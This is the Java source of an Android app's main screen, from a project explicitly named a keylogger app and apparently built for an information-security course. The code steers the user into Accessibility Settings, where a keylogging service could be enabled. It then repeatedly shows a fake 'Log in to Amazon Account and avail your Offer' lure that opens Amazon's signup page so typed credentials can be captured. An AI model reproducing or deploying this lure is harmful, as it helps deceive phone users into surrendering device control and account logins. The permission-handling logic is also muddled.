package com.haneet.infsec.keylogapp;

import android.app.AlertDialog;
import android.content.DialogInterface;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.Build;
import android.provider.Settings;
import android.support.v4.app.ActivityCompat;
import android.support.v4.content.ContextCompat;
import android.support.v7.app.AppCompatActivity;
import android.os.Bundle;
import android.widget.Button;
import com.haneet.infsec.keylogapp.util.Helper;

import static android.Manifest.permission.ACCESS_FINE_LOCATION;
import static android.Manifest.permission.INTERNET;

public class MainActivity extends AppCompatActivity {

    private final static String LOG_TAG = Helper.getLogTag(MainActivity.class);

    private Button button;
    private boolean isGranted = false;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        if (!checkPermission()) {
            requestPermission();
        }
        button = findViewById(R.id.btn_settings);
        button.setOnClickListener(v -> {
            if(!isGranted) {
                Intent openSettings = new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS);
                openSettings.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_NO_HISTORY);
                startActivity(openSettings);
                isGranted = true;
            }else{
                Intent intent = new Intent(Intent.ACTION_VIEW, Uri.parse("https://www.primevideo.com/signup/ref=atv_nb_signup_sf"));
                startActivity(intent);
            }
        });
    }

    private static final int PERMISSION_REQUEST_CODE = 200;

    private boolean checkPermission() {
        int result = ContextCompat.checkSelfPermission(getApplicationContext(), INTERNET);
        return result == PackageManager.PERMISSION_GRANTED;
    }

    private void requestPermission() {
        ActivityCompat.requestPermissions(this, new String[]{INTERNET}, PERMISSION_REQUEST_CODE);
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, String permissions[], int[] grantResults) {
        switch (requestCode) {
            case PERMISSION_REQUEST_CODE:
                if (grantResults.length > 0) {
                    boolean internetAccepted = grantResults[0] == PackageManager.PERMISSION_GRANTED;
                    if (!internetAccepted) {
                        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                            if (shouldShowRequestPermissionRationale(ACCESS_FINE_LOCATION)) {
                                showMessageOKCancel("You need to allow access to both the permissions",
                                        (dialog, which) -> {
                                            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                                                requestPermissions(new String[]{INTERNET},
                                                        PERMISSION_REQUEST_CODE);
                                            }
                                        });
                                return;
                            }
                        }

                    }
                }


                break;
        }
    }

    private void showMessageOKCancel(String message, DialogInterface.OnClickListener okListener) {
        new AlertDialog.Builder(MainActivity.this)
                .setMessage(message)
                .setPositiveButton("OK", okListener)
                .setNegativeButton("Cancel", null)
                .create()
                .show();
    }

    @Override
    protected void onPause() {
        super.onPause();
        showMessageOKCancel("Log in to Amazon Account and avail your Offer",
                (dialog,which)->{
                    Intent intent = new Intent(Intent.ACTION_VIEW, Uri.parse("https://www.primevideo.com/signup/ref=atv_nb_signup_sf"));
                    startActivity(intent);
        });
    }
}
